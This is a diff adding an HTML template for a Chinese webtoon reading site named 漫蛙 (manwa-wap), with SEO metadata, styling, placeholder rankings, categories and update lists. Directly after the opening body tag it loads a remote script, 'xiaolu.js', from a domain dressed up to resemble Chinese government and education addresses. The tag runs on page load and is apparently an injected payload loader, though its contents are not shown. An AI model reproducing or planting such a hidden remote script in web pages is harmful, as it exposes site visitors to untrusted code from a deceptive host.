@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>漫蛙 - 韩漫漫画在线阅读与追更平台</title>
+<meta name="description" content="漫蛙（https://manwa-wap）专注韩漫、国漫、条漫在线阅读，提供恋爱、悬疑、奇幻、剧情漫画推荐与人气排行榜，支持手机追更。">
+<meta name="keywords" content="漫蛙,韩漫,条漫,在线漫画,漫画推荐,manwa-wap">
+<meta name="author" content="漫蛙">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://manwa-wap">
+<meta property="og:title" content="漫蛙 - 韩漫漫画在线阅读与追更平台">
+<meta property="og:description" content="漫蛙提供韩漫、国漫、条漫在线阅读与漫画推荐，支持手机追更。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://manwa-wap">
+<meta property="og:site_name" content="漫蛙">
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<style>
+:root{
+  --bg:#0f1117;
+  --panel:#171a22;
+  --panel-2:#1e222c;
+  --line:#2a2f3a;
+  --txt:#e8eaf0;
+  --muted:#8c93a1;
+  --frog:#4ade80;     /* 蛙绿 */
+  --frog-deep:#22c55e;
+  --accent:#a78bfa;   /* 韩漫紫 */
+  --pink:#f472b6;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);color:var(--txt);
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",Arial,sans-serif;
+  -webkit-tap-highlight-color:transparent;
+}
+a{color:var(--frog);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶栏 */
+.topbar{
+  position:sticky;top:0;z-index:60;
+  background:rgba(15,17,23,.88);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .inner{
+  max-width:1120px;margin:0 auto;
+  padding:12px 16px;display:flex;align-items:center;gap:12px;
+}
+.logo{
+  font-size:22px;font-weight:900;letter-spacing:1px;
+  color:var(--frog);
+}
+.logo i{font-style:normal;color:var(--accent)}
+.search{
+  flex:1;display:flex;gap:6px;
+}
+.search input{
+  flex:1;background:var(--panel);border:1px solid var(--line);
+  border-radius:10px;padding:9px 12px;color:var(--txt);font-size:14px;outline:none;
+}
+.search input:focus{border-color:var(--frog)}
+.btn{
+  background:var(--frog);color:#0b0d11;border:0;
+  padding:9px 14px;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer;
+}
+.btn.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px}
+section{padding:32px 0;border-bottom:1px solid var(--line)}
+.eyebrow{font-size:12px;letter-spacing:3px;color:var(--frog);text-transform:uppercase}
+h2.title{font-size:24px;margin:4px 0 6px}
+.sub{color:var(--muted);font-size:14px;margin-bottom:18px}
+
+/* Hero：左侧章节列表 + 右侧阅读预览 */
+.hero{
+  display:grid;grid-template-columns:1.05fr 1fr;gap:24px;align-items:start;
+}
+.reader{
+  background:var(--panel);border:1px solid var(--line);border-radius:16px;overflow:hidden;
+}
+.reader-bar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:10px 14px;background:var(--panel-2);font-size:13px;
+}
+.reader-bar .progress{color:var(--muted)}
+.bar{height:4px;background:var(--line);position:relative}
+.bar i{position:absolute;left:0;top:0;height:100%;width:38%;background:var(--frog);font-style:normal}
+.strip{
+  background:linear-gradient(180deg,#1b1f28,#232936);
+  padding:14px;display:grid;gap:8px;
+}
+.panel{
+  background:repeating-linear-gradient(45deg,#3a4150,#3a4150 10px,#323846 10px,#323846 20px);
+  border-radius:8px;height:74px;opacity:.9;
+}
+.reader-foot{
+  padding:10px 14px;font-size:12px;color:var(--muted);
+  display:flex;justify-content:space-between;
+}
+
+.ch-list{list-style:none}
+.ch-list li{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:13px 14px;border:1px solid var(--line);
+  border-radius:12px;margin-bottom:8px;background:var(--panel);
+  transition:border-color .2s;
+}
+.ch-list li:hover{border-color:var(--frog)}
+.ch-list .t{font-size:15px;font-weight:600}
+.ch-list .m{font-size:12px;color:var(--muted);margin-top:2px}
+.ch-list .n{
+  font-size:12px;padding:3px 10px;border-radius:999px;
+  background:var(--accent);color:#0b0d11;font-weight:700;
+}
+.ch-list .n.old{background:var(--panel-2);color:var(--muted)}
+
+/* 排行榜 */
+.rank{list-style:none;counter-reset:r}
+.rank li{
+  counter-increment:r;display:grid;grid-template-columns:32px 56px 1fr auto;
+  gap:12px;align-items:center;padding:12px 0;border-bottom:1px solid var(--line);
+}
+.rank li::before{
+  content:counter(r);
+  width:32px;height:32px;border-radius:10px;
+  background:var(--panel-2);color:var(--frog);
+  display:flex;align-items:center;justify-content:center;font-weight:800;
+}
+.rank li:nth-child(1)::before{background:var(--frog);color:#0b0d11}
+.rank li:nth-child(2)::before{background:var(--accent);color:#0b0d11}
+.rank li:nth-child(3)::before{background:var(--pink);color:#0b0d11}
+.rank .thumb{
+  width:56px;height:74px;border-radius:8px;
+  background:linear-gradient(135deg,#2a3140,#232a38);
+}
+.rank h3{font-size:15px}
+.rank .m{font-size:12px;color:var(--muted);margin-top:2px}
+.rank .hot{font-size:13px;color:var(--frog);font-weight:700}
+
+/* 分类网格 */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+.cat{
+  border:1px solid var(--line);border-radius:14px;padding:16px 12px;text-align:center;
+  background:var(--panel);transition:transform .2s,border-color .2s;
+}
+.cat:hover{transform:translateY(-3px);border-color:var(--frog)}
+.cat .ic{font-size:24px;display:block;margin-bottom:6px}
+.cat span{font-size:14px}
+
+/* 漫画卡 */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.manga{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.cover{
+  aspect-ratio:3/4;background:linear-gradient(160deg,#1f2530,#262d3a);
+  display:flex;align-items:center;justify-content:center;font-size:38px;
+}
+.manga .info{padding:12px}
+.manga h3{font-size:15px;line-height:1.3}
+.manga .meta{font-size:12px;color:var(--muted);margin-top:5px;display:flex;justify-content:space-between}
+.tag{
+  display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;margin-top:8px;
+  background:rgba(74,222,128,.12);color:var(--frog);
+}
+
+/* 指南 */
+.guide{list-style:none}
+.guide li{
+  padding:14px 0;border-bottom:1px dashed var(--line);display:flex;gap:12px;align-items:baseline;
+}
+.guide .num{font-weight:800;color:var(--accent);font-size:16px;min-width:26px}
+.guide a{font-size:15px}
+.guide a:hover{color:var(--frog)}
+
+/* 关于 */
+.about p{color:#c9cdd8;max-width:780px;font-size:15px}
+
+footer{
+  background:#0b0d11;padding:28px 16px;text-align:center;font-size:13px;color:#8c93a1;line-height:1.9;
+}
+footer a{color:var(--frog)}
+footer .logo-b{font-size:20px;font-weight:900;color:var(--frog);margin-bottom:6px}
+footer .sm{font-family:Arial}
+
+/* 移动端 */
+@media (max-width:860px){
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .hero{grid-template-columns:1fr}
+  .reader{order:2}
+}
+@media (max-width:480px){
+  .topbar .inner{gap:8px}
+  .search input{font-size:13px}
+  .btn{padding:9px 10px}
+  h2.title{font-size:20px}
+  .manga h3{font-size:14px}
+}
+</style>
+
+<header class="topbar">
+  <div class="inner">
+    <div class="logo">漫<i>蛙</i></div>
+    <div class="search">
+      <input type="search" placeholder="搜索：漫蛙 / 韩漫 / 恋爱 / 奇幻…" aria-label="搜索漫画">
+      <button class="btn" type="button">搜索</button>
+    </div>
+    <button class="btn ghost" type="button">登录</button>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- 栏目1：阅读器（首页） -->
+  <section id="home">
+    <div class="eyebrow">Now Reading</div>
+    <h2 class="title">漫蛙 · 沉浸式条漫阅读器</h2>
+    <p class="sub">蛙绿主题、竖屏长条滚动、章节自动记忆，手机上翻页不打断。下面是阅读器 UI 预览。</p>
+    <div class="hero">
+      <ul class="ch-list">
+        <li><div><div class="t">第 42 话 · 雨夜的告白</div><div class="m">已更新 · 62 张</div></div><span class="n">NEW</span></li>
+        <li><div><div class="t">第 41 话 · 隔着车窗</div><div class="m">昨日更新 · 58 张</div></div><span class="n">NEW</span></li>
+        <li><div><div class="t">第 40 话 · 未读的短信</div><div class="m">2 天前 · 60 张</div></div><span class="n old">已读</span></li>
+        <li><div><div class="t">第 39 话 · 她的旧地址</div><div class="m">3 天前 · 61 张</div></div><span class="n old">已读</span></li>
+        <li><div><div class="t">第 38 话 · 第三个夏天</div><div class="m">5 天前 · 59 张</div></div><span class="n old">已读</span></li>
+      </ul>
+      <div class="reader">
+        <div class="reader-bar"><span>《雨夜的告白》</span><span class="progress">第 42 话 · 38%</span></div>
+        <div class="bar"><i></i></div>
+        <div class="strip">
+          <div class="panel"></div><div class="panel"></div><div class="panel"></div><div class="panel"></div>
+        </div>
+        <div class="reader-foot"><span>← 上一话</span><span>下一话 →</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2：人气排行榜 -->
+  <section id="rank">
+    <div class="eyebrow">Ranking</div>
+    <h2 class="title">人气排行榜</h2>
+    <p class="sub">漫蛙按阅读量、追更数与更新频率综合排序，每周刷新。</p>
+    <ul class="rank">
+      <li><div class="thumb"></div><div><h3><a href="#">雨夜的告白</a></h3><div class="m">恋爱 / 都市 · 连载中</div></div><span class="hot">128.6w</span></li>
+      <li><div class="thumb"></div><div><h3><a href="#">第七号嫌疑人</a></h3><div class="m">悬疑 / 推理 · 连载中</div></div><span class="hot">112.3w</span></li>
+      <li><div class="thumb"></div><div><h3><a href="#">剑落江南</a></h3><div class="m">国漫 / 古风 · 连载中</div></div><span class="hot">104.9w</span></li>
+      <li><div class="thumb"></div><div><h3><a href="#">便利店小姐</a></h3><div class="m">治愈 / 日常 · 已完结</div></div><span class="hot">96.2w</span></li>
+      <li><div class="thumb"></div><div><h3><a href="#">合约恋人 99 天</a></h3><div class="m">韩漫 / 都市 · 连载中</div></div><span class="hot">91.7w</span></li>
+    </ul>
+  </section>
+
+  <!-- 栏目3：漫画分类 -->
+  <section id="category">
+    <div class="eyebrow">Categories</div>
+    <h2 class="title">漫画分类</h2>
+    <p class="sub">按题材、地区、更新进度三维筛选，一屏找到想追的类型。</p>
+    <div class="cats">
+      <a class="cat" href="#"><span class="ic">💕</span><span>恋爱</span></a>
+      <a class="cat" href="#"><span class="ic">🏫</span><span>校园</span></a>
+      <a class="cat" href="#"><span class="ic">🕵️</span><span>悬疑</span></a>
+      <a class="cat" href="#"><span class="ic">⚔️</span><span>奇幻</span></a>
+      <a class="cat" href="#"><span class="ic">🌿</span><span>治愈</span></a>
+      <a class="cat" href="#"><span class="ic">🇰🇷</span><span>韩漫</span></a>
+      <a class="cat" href="#"><span class="ic">🇨🇳</span><span>国漫</span></a>
+      <a class="cat" href="#"><span class="ic">🔥</span><span>连载热更</span></a>
+    </div>
+
+    <div class="grid" style="margin-top:20px">
+      <a class="manga" href="#"><div class="cover">📖</div><div class="info"><h3>雨夜的告白</h3><div class="meta"><span>恋爱</span><span>42 话</span></div><span class="tag">热更</span></div></a>
+      <a class="manga" href="#"><div class="cover">🔍</div><div class="info"><h3>第七号嫌疑人</h3><div class="meta"><span>悬疑</span><span>28 话</span></div><span class="tag">烧脑</span></div></a>
+      <a class="manga" href="#"><div class="cover">🗡️</div><div class="info"><h3>剑落江南</h3><div class="meta"><span>国漫</span><span>156 话</span></div><span class="tag">国漫</span></div></a>
+      <a class="manga" href="#"><div class="cover">💘</div><div class="info"><h3>合约恋人 99 天</h3><div class="meta"><span>韩漫</span><span>99 话</span></div><span class="tag">韩漫</span></div></a>
+    </div>
+  </section>
+
+  <!-- 栏目4：今日更新 -->
+  <section id="update">
+    <div class="eyebrow">Updates</div>
+    <h2 class="title">今日更新</h2>
+    <p class="sub">漫蛙每日同步新话，追更不迷路。</p>
+    <ul class="guide">
+      <li><span class="num">1</span><a href="#">雨夜的告白 · 第 42 话（恋爱 / 都市）</a></li>
+      <li><span class="num">2</span><a href="#">第七号嫌疑人 · 第 28 话（悬疑 / 推理）</a></li>
+      <li><span class="num">3</span><a href="#">剑落江南 · 第 156 话（国漫 / 古风）</a></li>
+      <li><span class="num">4</span><a href="#">合约恋人 99 天 · 第 99 话（韩漫 / 都市）</a></li>
+      <li><span class="num">5</span><a href="#">小巷便利店 · 番外篇（治愈 / 已完结）</a></li>
+    </ul>
+  </section>
+
+  <!-- 栏目5：关于漫蛙 -->
+  <section id="about" class="about">
+    <div class="eyebrow">About</div>
+    <h2 class="title">关于漫蛙</h2>
+    <p>
+      漫蛙（https://manwa-wap）是一个面向手机读者的韩漫与条漫在线阅读站：
+      收藏自动归类“追更中 / 待补完 / 已完结”，阅读历史跨设备还原，支持按题材、地区与更新频率快速筛书。
+      无论偏爱恋爱、悬疑、奇幻还是国漫韩漫，都能在漫蛙找到下一本想追的作品。
+    </p>
+  </section>
+
+</div>
+
+<footer>
+  <div class="logo-b">漫蛙</div>
+  <div>漫蛙 · 韩漫漫画在线阅读与追更平台</div>
+  <div>官网：<a href="https://manwa-wap">https://manwa-wap</a></div>
+  <div class="sm">关键词：漫蛙 / 韩漫 / 条漫 / 在线漫画 / manwa-wap</div>
+  <div class="sm">单页演示模板，内页链接以 # 占位；上线后到 Bing Webmaster Tools 提交 sitemap.xml 更易被收录。</div>
+</footer>
+
+</body>
+</html>
